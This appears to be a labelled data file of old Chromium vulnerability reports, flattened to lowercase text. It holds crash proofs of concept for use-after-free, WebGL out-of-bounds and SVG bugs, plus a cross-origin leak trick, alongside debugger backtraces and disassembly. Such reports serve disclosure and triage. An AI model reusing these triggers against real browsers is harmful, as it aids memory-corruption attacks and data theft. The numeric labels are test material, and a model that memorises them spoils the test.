firstlineboxbaseline const+56 eflags if rf cs 51 ss 43 ds 0 es 0 type return to continue or q return to quit fs 0 gs 0 gdb print this can not access memory at address gdb	11
stale iterator in svgdocumentextensions startanimations vulnerability details sad tab in bad html version chrome version chromium 11.0.653.0 developer build 73068 ubuntu 10.10 on ubuntu maverick 2.6.35-25-generic chrome 8.0.552.236 official build 70801 on osx snow leopard 10.6 reproduction case data text/html base64 phn2zz4kpgcgawq9iliipgo8bgluzwfyr3jhzgllbnqgawq9imcipjxhbmltyxrlvhjhbnnmb3jtigf0dhjpynv0zu5hbwu9imeilz48l2xpbmvhckdyywrpzw50pgo8zm9udd48zm9udc1mywnligzvbnqtzmftawx5psj4ii8+pgzvbnq+cjx4bwxuczp4bgluaz0ioi94lzawlyigyj0idj0imiijztwvc2nyaxb0pgo8c3znpjxsaw5lyxjhcmfkawvudcbpzd0izyi+pgfuaw1hdgvucmfuc2zvcm0gyxr0cmlidxrltmftzt0iysivpjwvbgluzwfyr3jhzgllbnq+cjxzdmc+pgxpbmvhckdyywrpzw50iglkpsjnij48yw5pbwf0zvryyw5zzm9ybsbhdhryawj1dgvoyw1lpsjhii8+pc9saw5lyxjhcmfkawvudd4kphhtbg5zonhsaw5rpsi6l3gvmdaviibipsiidj0imiijztwvc2nyaxb0pgo8c3znpgo8zybpzd0iuii+cjxsaw5lyxjhcmfkawvudcbpzd0izyi+pgfuaw1hdgvucmfuc2zvcm0gyxr0cmlidxrltmftzt0iysivpjwvbgluzwfyr3jhzgllbnq+cjwvzz4kphn2zz4kphn2zz4kpgcgawq9iliipgo8bgluzwfyr3jhzgllbnqgawq9imcipjxhbmltyxrlvhjhbnnmb3jtigf0dhjpynv0zu5hbwu9imeilz48l2xpbmvhckdyywrpzw50pgo8l2c+cjx1cjwvzz4kphn2zz4kpgcgawq9iliipjwvzz4kphvzzsb4bgluazpocmvmpsijuii+cgo8l2c+cjx1cjwvzz4kphn2zz4kpgcgawq9iliipjwvzz4kphvzzsb4bgluazpocmvmpsijuii+cg for crashes please include the following additional information type of crash sad tab crash state gdb r starting program usr/lib/chromium-browser/chromium-browser single-process small.html program received signal sigsegv segmentation fault switching to thread lwp 728 in gdb gdb bt 0 in 1 in webcore element getattribute this name href at third_party/webkit/source/webcore/dom/element.cpp:231 2 in webcore svgsmilelement xlinkhref this at third_party/webkit/source/webcore/svg/animation/svgsmilelement.cpp:512 3 in webcore svgsmilelement targetelement this at third_party/webkit/source/webcore/svg/animation/svgsmilelement.cpp:464 4 in webcore smiltimecontainer updateanimations this value optimized out elapsed=dwarf-2 expression error dw_op_reg operations must be used either alone or in conjuction with dw_op_piece or dw_op_bit_piece at third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:238 5 in webcore smiltimecontainer begin this at third_party/webkit/source/webcore/svg/animation/smiltimecontainer.cpp:103 6 in webcore svgdocumentextensions startanimations this value optimized out at third_party/webkit/source/webcore/svg/svgdocumentextensions.cpp:98 7 in webcore document implicitclose this at third_party/webkit/source/webcore/dom/document.cpp:2209 8 in webcore frameloader checkcompleted this at third_party/webkit/source/webcore/loader/frameloader.cpp:842 9 in webcore frameloader finishedparsing this at third_party/webkit/source/webcore/loader/frameloader.cpp:776 10 in webcore document finishedparsing this at third_party/webkit/source/webcore/dom/document.cpp:4282 11 in webcore htmldocumentparser preparetostopparsing this at third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:150 12 in webcore htmldocumentparser finish this at third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:384 13 in webcore documentwriter endifnotloadingmainresource this at third_party/webkit/source/webcore/loader/documentwriter.cpp:221 14 in webcore frameloader finishedloading this at third_party/webkit/source/webcore/loader/frameloader.cpp:2184 15 in webcore mainresourceloader didfinishloading this finishtime value optimized out at third_party/webkit/source/webcore/loader/mainresourceloader.cpp:463 16 in webkit_glue weburlloaderimpl context oncompletedrequest this status value optimized out security_info value optimized out completion_time at webkit/glue/weburlloader_impl.cc:655 17 in resourcedispatcher onrequestcomplete this value optimized out request_id value optimized out status security_info completion_time at chrome/common/resource_dispatcher.cc:457 18 in dispatchtomethod resourcedispatcher void resourcedispatcher int net urlrequeststatus const std string const base time const int net urlrequeststatus std basic_string char std char_traits char std allocator char base time this message at base/tuple.h:570 19 dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std string const base time const this message at ipc/ipc_message_utils.h:933 20 resourcedispatcher dispatchmessage this message at chrome/common/resource_dispatcher.cc:530 21 in resourcedispatcher onmessagereceived this message at chrome/common/resource_dispatcher.cc:297 22 in childthread onmessagereceived this msg at chrome/common/child_thread.cc:144 23 in messageloop runtask this task at base/message_loop.cc:362 24 in messageloop deferorrunpendingtask this pending_task value optimized out at base/message_loop.cc:371 25 in messageloop dowork this at base/message_loop.cc:564 26 in base messagepumpdefault run this delegate at base/message_pump_default.cc:23 27 in runhandler this at base/message_loop.cc:310 28 messageloop run this at base/message_loop.cc:234 29 in base thread threadmain this at base/threading/thread.cc:164 30 in base anonymous namespace threadfunc params value optimized out at base/threading/platform_thread_posix.cc:51 31 in start_thread arg value optimized out at pthread_create.c:304 32 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 33 in gdb i r rax 140737372705792 rbx 140737372625408 rcx 140737372586304 rdx 140737371869120 rsi 140737358917120 rdi 140737372625408 rbp rsp r8 64 r9 140736935817760 r10 140737371620576 r11 140737194966099 r12 140736935818176 r13 0 r14 0 r15 140736935820336 rip eflags pf zf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb disas no function contains program counter for selected frame gdb up 1 in webcore element getattribute this name href at third_party/webkit/source/webcore/dom/element.cpp:231 231 third_party/webkit/source/webcore/dom/element.cpp no such file or directory in third_party/webkit/source/webcore/dom/element.cpp gdb disas dump of assembler code for function webcore element getattribute webcore qualifiedname const const 0 push rbp 1 mov rsi rbp 4 push rbx 5 mov rdi rbx 8 sub rsp 12 mov rip rax 19 mov rax rdx 22 cmp rdx rsi 25 je webcore element getattribute webcore qualifiedname const const+202 31 mov rbx eax 34 test eax 39 je webcore element getattribute webcore qualifiedname const const+182 45 mov rbx rax 49 test rax rax 52 je webcore element getattribute webcore qualifiedname const const+168 54 mov rax r8d 58 test r8d r8d 61 je webcore element getattribute webcore qualifiedname const const+168 63 mov rax rdi 67 mov rbp rsi 71 mov rdi rax 74 mov rax rdx 78 cmp rsi rdx 81 je webcore element getattribute webcore qualifiedname const const+127 83 mov rsi rbp 87 mov ecx 92 xor ebx ebx 94 xchg ax ax 96 cmp rbp rdx 100 je webcore element getattribute webcore qualifiedname const const+144 102 add ebx 105 cmp ebx r8d 108 jbe webcore element getattribute webcore qualifiedname const const+168 110 mov rdi rcx,1 rax 114 add rcx 118 mov rax rdx 122 cmp rsi rdx 125 jne webcore element getattribute webcore qualifiedname const const+96 127 add rsp 131 add rax 135 pop rbx 136 pop rbp 137 retq 138 jmp webcore element getattribute webcore qualifiedname const const+144 140 nop 141 nop 142 nop 143 nop 144 mov rsi r9 148 cmp r9 rdx 152 je webcore element getattribute webcore qualifiedname const const+127 154 add ebx 157 cmp ebx r8d 160 ja webcore element getattribute webcore qualifiedname const const+110 162 jmp webcore element getattribute webcore qualifiedname const const+168 164 nop 165 nop 166 nop 167 nop 168 mov rip rax 175 add rsp 179 pop rbx 180 pop rbp 181 retq 182 mov rbx rax 185 mov rbp rsi 188 mov rbx rdi 191 callq rax 197 jmpq webcore element getattribute webcore qualifiedname const const+45 202 mov rdi eax 205 test eax 210 jne webcore element getattribute webcore qualifiedname const const+34 216 mov rdi rax 219 jmp webcore element getattribute webcore qualifiedname const const+224 221 nop 222 nop 223 nop 224 callq rax 230 jmpq webcore element getattribute webcore qualifiedname const const+31 end of assembler dump gdb	9
stale nodes in document recalcstyleselector 002cf380 692a6e9d 002cf3dc 692a6cce chrome_68db0000 webcore document recalcstyleselector d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\document.cpp 2909 002cf3f0 699306a2 chrome_68db0000 webcore document styleselectorchanged d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\document.cpp 2823 002cf3fc 698ea00d chrome_68db0000 webcore styleelement removedfromdocument d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\styleelement.cpp 71 002cf40c 69301b66 chrome_68db0000 webcore svgstyleelement removedfromdocument d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\svg\svgstyleelement.cpp 114 002cf418 69301b07 chrome_68db0000 webcore private addchildnodestodeletionqueue webcore node webcore containernode d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernodealgorithms.h 139 002cf438 692ffff8 chrome_68db0000 webcore removeallchildrenincontainer webcore node webcore containernode d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernodealgorithms.h 62 002cf440 692b1466 chrome_68db0000 webcore containernode containernode d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernode.cpp 98 002cf450 698d9414 chrome_68db0000 webcore element element d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\element.cpp 79 002cf478 698da93d chrome_68db0000 webcore svgelement svgelement d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\svg\svgelement.cpp 82 002cf480 698e96bf chrome_68db0000 webcore svgsvgelement scalar deleting destructor 002cf488 6940085a chrome_68db0000 webcore treeshared webcore svgelementinstance removedlastref d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\platform\treeshared.h 122 002cf498 69400bb2 chrome_68db0000 webcore xmldocumentparser clearcurrentnodestack d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\xmldocumentparser.cpp 112 002cf4a0 6937d834 chrome_68db0000 webcore xmldocumentparser end d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\xmldocumentparser.cpp 241 002cf4ec 694011fc chrome_68db0000 webcore xmldocumentparser resumeparsing d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\xmldocumentparserlibxml2.cpp 1419 002cf56c 693d3b2a chrome_68db0000 webcore xmldocumentparser notifyfinished d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\xmldocumentparser.cpp 370 002cf590 693d3b59 chrome_68db0000 webcore cachedscript checknotify d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\loader\cachedscript.cpp 100 002cf598 692f86ac chrome_68db0000 webcore cachedscript error d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\loader\cachedscript.cpp 107 002cf5bc 692f85f6 chrome_68db0000 webcore loader host didfail d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\loader\loader.cpp 459 002cf5c8 693d1471 chrome_68db0000 webcore loader host didfail d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\loader\loader.cpp 428	11
security webcore htmltextareaelement updatevalue test on 8.0.552.237 eax=66c9fe68 ebx=03a0cb84 ecx=0379b150 edx=03a0cc08 esi=03a0cb84 edi=0379b150 eip=722d7463 esp=0014eae4 ebp=0014eaf0 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 722d7463 2:025 k childebp retaddr warning frame ip not in any known module following frames may be wrong 0014eae0 663a7642 0014eaf0 6677f905 chrome_65c00000 webcore htmltextareaelement updatevalue d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\html\htmltextareaelement.cpp 272 0014eafc 6677f8d6 chrome_65c00000 webcore rendertextcontrolmultiline rendertextcontrolmultiline d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\rendertextcontrolmultiline.cpp 42 0014eb04 660e29a4 chrome_65c00000 webcore rendertextcontrolmultiline scalar deleting destructor 0014eb10 660e292b chrome_65c00000 webcore renderobject arenadelete d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderobject.cpp 2219 0014eb28 66154583 chrome_65c00000 webcore renderobject destroy d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderobject.cpp 2186 0014eb38 660ee241 chrome_65c00000 webcore renderbox destroy d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\rendering\renderbox.cpp 209 0014eb48 660ed537 chrome_65c00000 webcore node detach d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\node.cpp 1220 0014eb74 66101466 chrome_65c00000 webcore node node d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\node.cpp 385 0014ebbc 66151b15 chrome_65c00000 webcore element element d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\element.cpp 79 0014ebd8 6614fff8 chrome_65c00000 webcore removeallchildrenincontainer webcore node webcore containernode d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernodealgorithms.h 64 0014ebe0 66101466 chrome_65c00000 webcore containernode containernode d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernode.cpp 98 0014ebf0 6638845c chrome_65c00000 webcore element element d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\element.cpp 79 0014ebf8 667396bf chrome_65c00000 webcore htmlobjectelement scalar deleting destructor 0014ec00 66150e2e chrome_65c00000 webcore treeshared webcore svgelementinstance removedlastref d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\platform\treeshared.h 122 0014ec18 66150cea chrome_65c00000 webcore containernode dispatchpostattachcallbacks d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernode.cpp 707 0014ec24 660f4d86 chrome_65c00000 webcore containernode resumepostattachcallbacks d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\containernode.cpp 673 0014ec4c 660f6d30 chrome_65c00000 webcore document recalcstyle d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\document.cpp 1529 0014ec60 660f6c4f chrome_65c00000 webcore document styleselectorchanged d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\document.cpp 2839 0014ec6c 663b5e23 chrome_65c00000 webcore document removependingsheet d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\document.cpp 2798	9
webgl causes segfault vulnerability details segfault w webgl version chrome version chromium 11.0.658.0 ubuntu 10.10 google chrome 10.0.648.11 dev linux 2.6.35-25-generic 44-ubuntu x86_64 chromium 10.0.638.0 developer build 71206 osx snow leopard 10.6 reproduction case attached html file for crashes please include the following additional information type of crash sad tab crash state 0 in memcpy from lib/libc.so.6 1 in gpu gles2 gles2implementation buffersubdata this target value optimized out offset=0 size value optimized out data value optimized out at usr/include/bits/string3.h:52 2 in setupsimulatedindexbuffer this mode=4 count=878082192 type=5123 indices at gpu/command_buffer/client/gles2_implementation.cc:374 registers rsi r8 r14 where is a magic value from the repro gl.drawelements gl.triangles gl.unsigned_short	11
stale pointer in webcore renderblock insertfloatingobject vulnerability details stale pointer version 11.0.658.0 developer build 73582 ubuntu 10.10 2.6.35-25-generic x86_64 9.0.597.84 official build 72991 on osx snow leopard 10.6 9.0.597.84 official build 72991 on windows 7 32bit 9.0.597.84 official build 72991 on windows xp 32bit reproduction case textarea rows 100000000 textarea textarea style width 100 rows 100000000 textarea object data a align right object this segfaults at 140 but a more complex case which i ll attach will have jump to random memory for crashes please include the following additional information type of crash sad tab crash state 0 in 1 in webcore renderblock insertfloatingobject this o at third_party/webkit/source/webcore/rendering/renderblock.cpp:3074 2 in webcore renderblock layoutinlinechildren this relayoutchildren value optimized out repaintlogicaltop value optimized out repaintlogicalbottom value optimized out at third_party/webkit/source/webcore/rendering/renderblocklinelayout.cpp:869	11
oob read in webgl due to integer overflows ken can you please help with an owner here testcase put in webgl layouttest directory see attachment run using d chromium\src\chrome\release\chrome.exe disable-click-to-play disable-prompt-on-repost disable-hang-monitor disable-metrics enable-accelerated-2d-canvas enable-accelerated-compositing enable-accessibility enable-gpu-plugin enable-gpu-rendering enable-nacl enable-native-web-workers enable-search-provider-api-v2 force-internal-pdf force-renderer-accessibility enable-experimental-extension-apis enable-extension-timeline-api enable-webgl enable-extension-apps enable-geolocation enable-indexed-database no-first-run no-process-singleton-dialog no-default-browser-check enable-desktop-notifications js-flags expose-gc single-process new-window disable-plugins incognito allow-file-access-from-files disable-popup-blocking user-data-dir=d fuzztmp\t1677 d chromium\src\third_party\webkit\layouttests\fast\canvas\webgl\index-validation-fuzz-1296820232.74.html stacktrace first chance exceptions are reported before any exception handling this exception may be expected and handled exceptionaddress 6330cab0 libglesv2 gl vertexdataconverter float gl widenrule 0,3 gl conversionrule 5126,0,0 gl defaultvertexvalues float,0 convertarray exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000000 parameter 1 2d7a8628 attempt to read from address 2d7a8628 childebp retaddr 09a3ed8c 633091af libglesv2 gl vertexdataconverter float gl widenrule 0,3 gl conversionrule 5126,0,0 gl defaultvertexvalues float,0 convertarray float in memory access error unsigned int stride memory access error unsigned int n memory access error float out memory access error 09a3edb8 63309500 libglesv2 gl vertexdatamanager writeattributedata class gl arrayvertexbuffer vertexbuffer memory access error int start memory access error int count memory access error class gl vertexattribute attribute memory access error 09a3edf4 632ff256 libglesv2 gl vertexdatamanager preparevertexdata int start 7 int count 5 struct gl translatedattribute translated 09a3ef88 63303b84 libglesv2 gl context applyvertexbuffer int first memory access error int count memory access error 09a3efc4 632eab84 libglesv2 gl context drawelements unsigned int mode memory access error int count memory access error unsigned int type memory access error void indices memory access error 09a3effc 5ce81aba libglesv2 gldrawelements unsigned int mode 4 int count 3 unsigned int type void indices 09a3f02c 5ce8d399 chrome_5ce30000 gpu gles2 gles2decoderimpl handledrawelements unsigned int immediate_data_size memory access error struct gpu gles2 drawelements c memory access error 09a3f0e0 5ce8f5dd chrome_5ce30000 gpu gles2 gles2decoderimpl docommand unsigned int command memory access error unsigned int arg_count memory access error void cmd_data memory access error 09a3f104 5ce7c361 chrome_5ce30000 gpu commandparser processcommand void 09a3f1c0 5d28426a chrome_5ce30000 gpu gpuprocessor processcommands void 09a3f1c4 5ce7c4ec chrome_5ce30000 callbackimpl onnotificationballooncountobserver void struct tuple0 params 09a3f1d4 5d04a337 chrome_5ce30000 gpu commandbufferservice flushsync int put_offset 16 09a3f1f4 5ce67299 chrome_5ce30000 gpucommandbufferstub onflush int put_offset 199901760 struct gpu commandbuffer state state 09a3f2b8 5d04ad22 chrome_5ce30000 ipc messagewithreply tuple1 int tuple1 gpu commandbuffer state dispatch commandbufferstub commandbufferstub void class ipc message msg class commandbufferstub obj class commandbufferstub sender function func 09a3f378 5d58f5e0 chrome_5ce30000 gpucommandbufferstub onmessagereceived class ipc message message 09a3f388 5d047d9d chrome_5ce30000 messagerouter routemessage class ipc message msg 09a3f434 5cea2eba chrome_5ce30000 gpuchannel onmessagereceived class ipc message message 09a3f468 5cf6cb40 chrome_5ce30000 ipc syncchannel receivedsyncmsgqueue dispatchmessages void 09a3f520 5cf6d4e6 chrome_5ce30000 messageloop runtask class task task 09a3f550 5cf92818 chrome_5ce30000 messageloop dowork void	11
can instantiate non-public npapi plugins from extensions from tavis take an extension with a non-public npapi plugin plugins path plugins/npswitchy.dll path plugins/npswitchy.so path plugins/npswitchy64.so path plugins/iswitchy.bundle then on any public web page you can instantiate that plugin var o document.createelement object o.type application/x-mhdhejazi-switchy-1.6 document.body.appendchild o o.dosomething replace with something dangerous here it s supposed to be the case that in order for this to work that the extension needed to add public true to their plugin decl in the manifest	9
crash in containernodealgorithms.h with outdated ice-tea plugin vulnerability details crashes at third_party/webkit/source/webcore/dom/containernodealgorithms.h removeallchildrenincontainer genericnodecontainer container while executing this line delete n version chrome version 11.0.665.0 74248 dev release/debug operating system ubuntu 10.04 32 bit reproduction case 1 install out-dated ice-tea java plugin 2 open attached crash.html crash.html contains a applet chrome will show a info bar saying ice-tea java plugin is out-dated 3 move the mouse over java applet applet is not loaded at this moment since plugin is outdated 4 wait about 3 seconds crash.html will refresh itself once the page is refreshed chrome will display a sad tab it may be possible to reproduce this with other out-dated plugins as well i ll post on this issue if i can for crashes please include the following additional information type of crash tab crash state stack trace 0 in 1 in webcore removeallchildrenincontainer webcore node webcore containernode container at third_party/webkit/source/webcore/dom/containernodealgorithms.h:64 2 in webcore containernode removeallchildren this at third_party/webkit/source/webcore/dom/containernode.cpp:72 3 in webcore document removedlastref this at third_party/webkit/source/webcore/dom/document.cpp:534 4 in webcore treeshared webcore containernode deref this at third_party/webkit/source/webcore/platform/treeshared.h:79 5 in webcore domdatastore weaknodecallback value domobject at third_party/webkit/source/webcore/bindings/v8/domdatastore.cpp:165 6 in v8 internal globalhandles node postgarbagecollectionprocessing this at v8/src/global-handles.cc:182 7 in v8 internal globalhandles postgarbagecollectionprocessing at v8/src/global-handles.cc:387 8 in v8 internal heap performgarbagecollection collector=v8 internal mark_compactor tracer at v8/src/heap.cc:778 9 in v8 internal heap collectgarbage space=v8 internal old_pointer_space 10 in v8 internal heap collectgarbage space=v8 internal old_pointer_space at v8/src/heap-inl.h:412 11 in v8 internal heap collectallgarbage force_compaction=false at v8/src/heap.cc:451 12 in v8 internal heap idlenotification at v8/src/heap.cc:3838 13 in v8 internal v8 idlenotification at v8/src/v8.cc:240 14 in v8 v8 idlenotification at v8/src/api.cc:3340 15 in webcore v8gcforcontextdispose pseudoidletimerfired this at third_party/webkit/source/webcore/bindings/v8/v8gcforcontextdispose.cpp:69 16 in webcore timer webcore v8gcforcontextdispose fired this at third_party/webkit/source/webcore/platform/timer.h:99 17 in webcore threadtimers sharedtimerfiredinternal this at third_party/webkit/source/webcore/platform/threadtimers.cpp:112 18 in webcore threadtimers sharedtimerfired at third_party/webkit/source/webcore/platform/threadtimers.cpp:90 19 in webkit_glue webkitclientimpl dotimeout this at webkit/glue/webkitclient_impl.h:82 20 in dispatchtomethod webkit_glue webkitclientimpl void webkit_glue webkitclientimpl obj method webkit_glue webkitclientimpl dotimeout arg at base/tuple.h:541 21 in base basetimer webkit_glue webkitclientimpl false timertask run this at base/timer.h:160 22 in messageloop runtask this task at base/message_loop.cc:362 23 in messageloop deferorrunpendingtask this pending_task at base/message_loop.cc:371 24 in messageloop dodelayedwork this next_delayed_work_time at base/message_loop.cc:602 25 in base messagepumpdefault run this delegate at base/message_pump_default.cc:27 26 in messageloop runinternal this at base/message_loop.cc:337 27 in messageloop runhandler this at base/message_loop.cc:310 28 in messageloop run this at base/message_loop.cc:234 29 in renderermain parameters at chrome/renderer/renderer_main.cc:300 30 in runnamedprocesstypemain process_type main_function_params at chrome/app/chrome_main.cc:649 31 in chromemain argc=6 argv at chrome/app/chrome_main.cc:977 32 in main argc=6 argv at chrome/app/chrome_exe_main_gtk.cc:49 registers eax 208962208 ecx 15016 edx 0 ebx 1 esp ebp esi 0 edi 1 eip 0 eflags pf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51	11
stale pointer in webcore renderblock lowestposition vulnerability details after performing certain html dom operations chromium will crash instruction fetch at null likely due to a stale pointer in webcore renderblock lowestposition version chrome version chromium 9.0.597.94 ubuntu 10.04 64-bit reproduction case html body onload boom script type text/javascript function boom arbitrary0 document.createelement arbitrary document.documentelement.appendchild arbitrary0 colgroup document.createelement colgroup arbitrary1 document.createelement arbitrary arbitrary1.style.float left arbitrary1.appendchild document.createtextnode a li document.createelement li li.style.position fixed arbitrary2 document.createelement arbitrary arbitrary3 document.createelement arbitrary arbitrary0.appendchild arbitrary2 arbitrary2.appendchild colgroup arbitrary0.appendchild arbitrary1 document.body.offsettop arbitrary2.appendchild li document.body.offsettop arbitrary3.appendchild arbitrary0 script body html for crashes please include the following additional information type of crash tab chromium-browser debug single-process crash.html gdb run program received signal sigsegv segmentation fault switching to thread lwp 29458 in gdb bt 0 in 1 in webcore renderblock lowestposition this includeoverflowinterior=false includeself=true applytransform value optimized out at third_party/webkit/webcore/rendering/renderblock.cpp:3535 2 in webcore renderblock lowestposition this includeoverflowinterior=true includeself=true applytransform value optimized out at third_party/webkit/webcore/rendering/renderblock.cpp:3488 3 in webcore renderview docheight this at third_party/webkit/webcore/rendering/renderview.cpp:622 4 in webcore renderview layout this at third_party/webkit/webcore/rendering/renderview.cpp:135 5 in webcore frameview layout this allowsubtree value optimized out at third_party/webkit/webcore/page/frameview.cpp:828 gdb frame 1 1 in webcore renderblock lowestposition this includeoverflowinterior=false includeself=true applytransform value optimized out at third_party/webkit/webcore/rendering/renderblock.cpp:3535 3535 third_party/webkit/webcore/rendering/renderblock.cpp no such file or directory in third_party/webkit/webcore/rendering/renderblock.cpp gdb disas 698 nopw rax rax,1 704 mov rdx rdi 707 mov rdx r13d 711 mov rdi rax 714 mov rdx rsp 719 callq rax 725 mov rsp rdx 730 mov eax rsp gdb i r rax 140737370221120 rbx 140737370219896 rcx 0 rdx 140737372366240 rsi 140737373165504 rdi 140737370222032 rbp rsp r8 0 r9 0 r10 0 r11 0 r12 28 r13 8 r14 1 r15 0 rip webcore renderblock lowestposition bool bool webcore renderbox applytransform const+725 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb info locals r value optimized out it impl list node next prev transformedrect m_location m_x 0 m_y 0 m_size m_width 0 m_height 8 transformedbottom value optimized out bottom 28 relativeoffset 0 gdb the reproduction case and full trace in gdb are attached	9
browser crash when reproducing issue 64051 vulnerability details reproducing the renderer crash of issue 64051 occasionally causes the whole browser to crash this happens in printing modules of gtk it is easy to cause a fairly repeatable browser crash in chrome stable beta and unstable by opening a few of the print pdf s possibly this issue will also be taken care of by the fix of 64051 but as one of the causes of the crash is eip being 0 in the browser process might be worth double-checking the cause of this one version chrome version 8.0.552.224 official build 68599 stable and others operating system ubuntu 10.10 i686 reproduction case both print.pdf or print2.pdf from issue 64051 cause this gdb opt/google/chrome/chrome eval-command run print2.pdf print2.pdf print2.pdf print2.pdf at least on my machine this causes a browser crash with about 50 probability also opening just one file occasionally causes a crash for crashes please include the following additional information type of crash browser crash state program received signal sigsegv segmentation fault switching to thread lwp 652 in gdb bt 0 in 1 in gtk_print_backend_module_create pb_module at build/buildd/gtk+2.0-2.22.0/gtk/gtkprintbackend.c:250 2 in gtk_print_backend_create at build/buildd/gtk+2.0-2.22.0/gtk/gtkprintbackend.c:271 3 ia__gtk_print_backend_load_modules at build/buildd/gtk+2.0-2.22.0/gtk/gtkprintbackend.c:335 4 in load_print_backends print_dialog at build/buildd/gtk+2.0-2.22.0/gtk/gtkprintunixdialog.c:911 5 populate_dialog print_dialog at build/buildd/gtk+2.0-2.22.0/gtk/gtkprintunixdialog.c:3817 6 in g_type_create_instance from usr/lib/libgobject-2.0.so.0 7 in from usr/lib/libgobject-2.0.so.0 8 in g_object_newv from usr/lib/libgobject-2.0.so.0 9 in g_object_new_valist from usr/lib/libgobject-2.0.so.0 10 in g_object_new from usr/lib/libgobject-2.0.so.0 11 in ia__gtk_print_unix_dialog_new title parent at build/buildd/gtk+2.0-2.22.0/gtk/gtkprintunixdialog.c:3841 12 in 13 in 14 in 15 in 16 in 17 in 18 in 19 in 20 in 21 in 22 in 23 in start_thread arg at pthread_create.c:304 24 in clone at sysdeps/unix/sysv/linux/i386/clone.s:130 gdb info registers eax 1 ecx 179689088 edx 186912576 ebx 1209524236 esp ebp esi 187008240 edi 0 eip 0 eflags if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51	9
error prototypes are called on remote scripts vulnerability details referenceerror is called on remote scripts this can leak sensitive information from the remote site version chrome version 10.0.628.0 dev operating system all reproduction case script referenceerror.prototype.__definegetter name function e=this for var j in e if j name console.log j e j script script src script this will leak in the console asdf which is the content of the remote file	6
probable memory corruption in webcore counternode lastdescendant vulnerability details it appears that under certain circumstances spacer elements this may be arbitrary with a value set for their counterincrement property are not handled properly in one of the test cases provided a crash sometimes occurs due to an attempt to write to in webcore counternode lastdescendant version chrome version debugging done in chromium 8.0.552.224 ubuntu 10.04 also tested in google chrome 8.0.552.237 operating system ubuntu 10.04 64-bit reproduction case two test cases are attached the first file raw.html does a better job of producing the more troubling crashes the file trimmed.html usually crashes in webcore counternode removechild with this the file raw.html often crashes at this location as well in some cases i had to refresh trimmed.html a few times to trigger the crash this file seems to have most of the unnecessary dom operations removed the file trimmed.html is as the name implies a trimmed version of raw.html to better demonstrate what is causing the issue though it still contains a fair number of elements and operations for crashes please include the following additional information type of crash tab the following is a trace of the program in gdb produced when opening the file raw.html this is attached along with a separate trace using trimmed.html chromium-browser debug single-process raw.html env ld_library_path=/usr/lib/chromium-browser trimmed path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games trimmed gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.aorefd gnu gdb gdb 7.1-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu for bug reporting instructions please see reading symbols from usr/lib/chromium-browser/chromium-browser reading symbols from usr/lib/debug/usr/lib/chromium-browser/chromium-browser done done gdb run starting program usr/lib/chromium-browser/chromium-browser single-process raw.html thread debugging using libthread_db enabled warning the debug information found in usr/lib/debug//usr/lib/libxcb.so.1.1.0 does not match usr/lib/libxcb.so.1 crc mismatch warning the debug information found in usr/lib/debug/usr/lib/libxcb.so.1.1.0 does not match usr/lib/libxcb.so.1 crc mismatch new thread lwp 11213 new thread lwp 11214 new thread lwp 11215 new thread lwp 11216 new thread lwp 11217 new thread lwp 11218 new thread lwp 11219 new thread lwp 11220 new thread lwp 11221 new thread lwp 11222 new thread lwp 11223 thread lwp 11223 exited new thread lwp 11224 new thread lwp 11225 11205:11220:58461951281 error chrome/browser/net/chrome_url_request_context.cc 105 can not use v8 proxy resolver in single process mode new thread lwp 11226 new thread lwp 11227 program received signal sigsegv segmentation fault switching to thread lwp 11224 in webcore counternode lastdescendant this at third_party/webkit/webcore/rendering/counternode.cpp:78 